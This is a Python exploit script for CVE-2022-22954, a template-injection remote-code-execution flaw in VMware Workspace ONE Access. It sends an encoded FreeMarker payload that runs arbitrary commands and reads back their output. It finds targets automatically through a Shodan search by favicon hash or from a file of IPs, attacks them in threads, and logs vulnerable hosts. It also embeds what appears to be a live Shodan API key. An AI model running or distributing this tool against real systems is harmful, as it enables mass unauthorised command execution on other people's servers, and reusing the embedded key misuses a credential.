import requests
import sys
import re
import urllib
import threading
import argparse
import shodan
import datetime
import colorama 
import urllib3
urllib3.disable_warnings()


def print_green(data): print("\033[92m {}\033[00m" .format(data))
def print_red(data): print("\033[91m {}\033[00m" .format(data))
def print_lightgray(data):  print("\033[97m {}\033[00m" .format(data))


def create_file(data):
    current_date_and_time = 'vuln'
    current_date_and_time_string = str(current_date_and_time)
    extension = ".txt"
    file_name =  current_date_and_time_string + extension
    file = open(file_name, 'a')
    file.write(data)
    file.close()

def shodan_search(cmd=False):
    SHODAN_API_KEY = "Md6qc2qg4YKWANru7qHIQXIs3AUGF6He"
    api = shodan.Shodan(SHODAN_API_KEY)
    if cmd is None:
        cmd='id'    

    try:
        print_red("[+] Searching for targets ...\n")
        results = api.search('http.favicon.hash:-1250474341',page=2)
        ips =[] 
        
        for result in results['matches']:
            ips.append(result['ip_str'])
        
        for ip in ips:
            t = threading.Thread(target=get_vuln_host,args=(ip,cmd,))
            t.start()
    except shodan.APIError as e:
        print_red('Error: {}' . format(e))


def get_vuln_host(ip,cmd): 
    try:
        if not '://' in ip:
            url = "https://"+str(ip)
        else:
            url = str(ip)
            
        get = "/catalog-portal/ui/oauth/verify?error=&deviceUdid="
        cmd = urllib.parse.quote(cmd)
        payload = "%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22"+str(cmd)+"%22%29%7d"
        req=url+get+payload 
        print("Scanning Host: {}\n" . format(ip))
        r =requests.get(req,verify=False,headers={'Host':'localhost'},timeout=5)
        status_code = r.status_code 
        content = r.text 
        re_dev1 = re.compile(r'device id:(.*?),')
        re_dev2= re_dev1.findall(content)
        command = re_dev2[0].replace('\\n','\r\n')
        if status_code == 400: 
            print_green("[+]Vulnerable HOST, CMD SENT[{}],\n OUTPUT: {}" . format (cmd,command))
            create_file(url + '\n')
        else: 
            print_red("[+]Endpoint is not vulnerable\n")

    except requests.exceptions.RequestException:
        print_lightgray("[+]Timeout") 
    except: 
        print_red("[+]Error in URL, probably doesn't match with vulnerable target ")


def file_mode(cmd=False):
    if cmd is None:
        cmd='id'    

    try:
        ips="ips.txt"
        f = open(ips)
        ip_list = f.readlines()
    except IOError:
        print_red("Error: File does not exist.")
        return -1

    for ip in ip_list:
        ip = ip.strip('\r\n')
        try: 
            t = threading.Thread(target=get_vuln_host,args=(ip,cmd,))
            t.start()
        except: 
            print_red("[+]Error in URL, probably doesn't match with vulnerable target")
            continue



def set_mode(mode):
    if 'shodan' in mode[0]:
        pass
    if 'manual' in mode[0]:
        pass
    if 'file' in mode[0]:
        pass
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2022-22954 - PoC VMware Workspace ONE Access SSTI')    
    parser.add_argument("-m", "--mode",dest="set_mode",help="Available modes: shodan | file | manual",choices=['shodan','file','manual'],required=True)
    parser.add_argument("-i", "--ip",  help="Host IP", required=False)
    parser.add_argument("-c", "--cmd", help="Command string", required=False)    
    args, unknown = parser.parse_known_args()
    ip = args.ip
    cmd = args.cmd

    print_lightgray("[+] Working in {} mode " . format(args.set_mode))
    if 'manual' in args.set_mode:
        parser = argparse.ArgumentParser(description='CVE-2022-22954 - PoC VMware Workspace ONE Access SSTI')
        parser.add_argument("-m", "--mode",dest="set_mode", help="Available modes: shodan | file | manual",choices=['shodan','file','manual'],required=True)
        parser.add_argument("-i", "--ip",  help="Host IP", required=True)
        parser.add_argument("-c", "--cmd", help="Command string", required=True)        
        args, unknown = parser.parse_known_args()
        get_vuln_host(ip,cmd)
    if 'shodan' in args.set_mode:
        shodan_search(cmd)
        
    if 'file' in args.set_mode:
        file_mode(cmd)
    
